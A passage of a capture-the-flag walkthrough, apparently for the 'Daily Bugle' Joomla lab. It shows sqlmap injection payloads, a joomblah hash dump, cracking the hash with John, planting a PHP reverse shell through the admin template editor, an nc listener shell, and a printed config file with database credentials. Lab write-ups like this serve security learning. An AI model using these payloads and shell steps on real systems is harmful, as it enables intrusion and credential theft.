@@ -237,3 +237,243 @@ it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads sp
 [21:25:58] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
 [21:26:14] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
 [21:26:30] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[21:26:47] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[21:27:03] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[21:27:18] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[21:27:34] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[21:27:50] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[21:28:06] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[21:28:22] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                                                                
+[21:28:37] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[21:28:53] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[21:29:09] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[21:29:25] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[21:29:41] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
+[21:29:57] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
+[21:30:05] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[21:30:16] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
+[21:30:17] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
+[21:30:17] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
+[21:30:17] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
+[21:30:18] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[21:30:18] [INFO] GET parameter 'list[fullordering]' is 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' injectable 
+[21:30:18] [INFO] testing 'MySQL inline queries'
+[21:30:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[21:30:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[21:30:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[21:30:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[21:30:19] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[21:30:20] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[21:30:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[21:30:20] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
+[21:30:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
+[21:30:21] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
+[21:30:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
+[21:30:21] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
+[21:30:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
+[21:30:22] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
+[21:30:22] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
+[21:30:22] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
+[21:30:23] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
+[21:30:23] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
+[21:30:23] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
+[21:30:24] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
+[21:30:24] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
+[21:30:24] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
+[21:30:24] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
+[21:30:25] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
+[21:30:25] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
+[21:30:25] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
+[21:30:26] [INFO] testing 'MySQL AND time-based blind (ELT)'
+[21:30:26] [INFO] testing 'MySQL OR time-based blind (ELT)'
+[21:30:26] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
+[21:30:26] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
+[21:30:27] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
+[21:30:27] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'                                                                                                                
+[21:30:27] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
+[21:30:28] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
+[21:30:38] [INFO] GET parameter 'list[fullordering]' appears to be 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' injectable                                                                                 
+[21:30:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[21:30:38] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[21:30:45] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[21:30:51] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[21:30:57] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
+[21:31:02] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
+[21:31:08] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
+[21:31:14] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
+[21:31:20] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
+[21:31:25] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
+[21:31:31] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
+[21:31:37] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[21:31:43] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
+[21:31:49] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
+[21:31:55] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
+[21:32:01] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
+[21:32:07] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
+[21:32:13] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
+[21:32:18] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
+[21:32:24] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
+[21:32:30] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
+GET parameter 'list[fullordering]' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 2715 HTTP(s) requests:
+---
+Parameter: list[fullordering] (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 4845 FROM(SELECT COUNT(*),CONCAT(0x716a627171,(SELECT (ELT(4845=4845,1))),0x716a7a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 3021 FROM (SELECT(SLEEP(5)))drfF)
+---
+[21:34:37] [INFO] the back-end DBMS is MySQL
+[21:34:37] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+web server operating system: Linux CentOS 7
+web application technology: Apache 2.4.6, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[21:34:38] [INFO] fetching database names
+[21:34:39] [INFO] retrieved: 'information_schema'
+[21:34:39] [INFO] retrieved: 'joomla'
+[21:34:40] [INFO] retrieved: 'mysql'
+[21:34:40] [INFO] retrieved: 'performance_schema'
+[21:34:40] [INFO] retrieved: 'test'
+available databases [5]:
+[*] information_schema
+[*] joomla
+[*] mysql
+[*] performance_schema
+[*] test
+
+[21:34:40] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 2675 times
+[21:34:40] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.105.102'
+
+[*] ending @ 21:34:40 /2022-09-27/
+
+We can find existing exploits, like this one:
+```
+```text
+┌──(kali㉿kali)-[~/skynet/daily_bugle]
+└─$ python joomblah.py http://10.10.105.102
+                                                                                                                                                                                                                                    
+    .---.    .-'''-.        .-'''-.                                                           
+    |   |   '   _    \     '   _    \                            .---.                        
+    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
+    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
+    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
+    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
+    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
+    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
+    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
+    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
+ __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
+|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
+|____.'                                                                `--'  `" '---'   '---' 
+
+ [-] Fetching CSRF token
+ [-] Testing SQLi
+  -  Found table: fb9j5_users
+  -  Extracting users from fb9j5_users
+ [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
+  -  Extracting sessions from fb9j5_session
+
+using john
+```
+```text
+┌──(kali㉿kali)-[~/skynet/daily_bugle]
+└─$ echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > jonah.hash
+
+Now that we have Jonah’s hash, let’s crack it with John: 
+
+after 12 min
+```
+```text
+┌──(kali㉿kali)-[~/skynet/daily_bugle]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt jonah.hash                         
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+spiderman123     (?)     
+1g 0:00:12:04 DONE (2022-09-27 21:51) 0.001379g/s 64.61p/s 64.61c/s 64.61C/s thelma1..speciala
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+login
+http://10.10.105.102/administrator/index.php
+
+jonah:spiderman123
+
+Go to the administrator directory and login with jonah:spiderman123.
+
+Once logged in, go to Extensions > Templates > Templates and select Protostar:
+
+then index.php add https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+replacing your ip then save
+
+Now browse http://10.10.105.102/index.php
+
+First thing on the server was to list the homes, find users (jjameson is the only user in /home), and try to find user.txt (common name for user flag). No luck.
+
+Then, I inspected the /var/www/html/ directory and extracted the following information from the configuration.php file, which reveals the password for the database.
+```
+```text
+┌──(kali㉿kali)-[~/skynet/daily_bugle]
+└─$ rlwrap nc -nlvp 4444 
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.105.102.
+Ncat: Connection from 10.10.105.102:49124.
+Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 22:14:15 up  1:29,  0 users,  load average: 0.05, 0.10, 0.13
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+sh-4.2$ whoami
+whoami
+apache
+sh-4.2$ python3 -c "import pty;pty.spawn('/bin/bash')"
+python3 -c "import pty;pty.spawn('/bin/bash')"
+sh: python3: command not found
+sh-4.2$ python -c "import pty;pty.spawn('/bin/bash')"
+python -c "import pty;pty.spawn('/bin/bash')"
+
+priv esc
+
+When viewing the contents of the configuration.php file, which normally contains database credentials for Joomla, a password is revealed:
+
+bash-4.2$ cd /var/www/html
+cd /var/www/html
+bash-4.2$ ls
+ls
+LICENSE.txt    cli                includes   media       tmp
+README.txt     components         index.php  modules     web.config.txt
+administrator  configuration.php  language   plugins
+bin            htaccess.txt       layouts    robots.txt
+cache          images             libraries  templates
+bash-4.2$ cat configuration.php
+cat configuration.php
+<?php
+class JConfig {
+        public $offline = '0';
+        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
+        public $display_offline_message = '1';
+        public $offline_image = '';
+        public $sitename = 'The Daily Bugle';
+        public $editor = 'tinymce';
+        public $captcha = '0';
+        public $list_limit = '20';
+        public $access = '1';
+        public $debug = '0';
+        public $debug_lang = '0';
+        public $dbtype = 'mysqli';
+        public $host = 'localhost';
+        public $user = 'root';
+        public $password = 'nv5uz9r3ZEDzVjNu';
+        public $db = 'joomla';
+        public $dbprefix = 'fb9j5_';
+        public $live_site = '';
+        public $secret = 'UAMBRWzHO3oFPmVC';
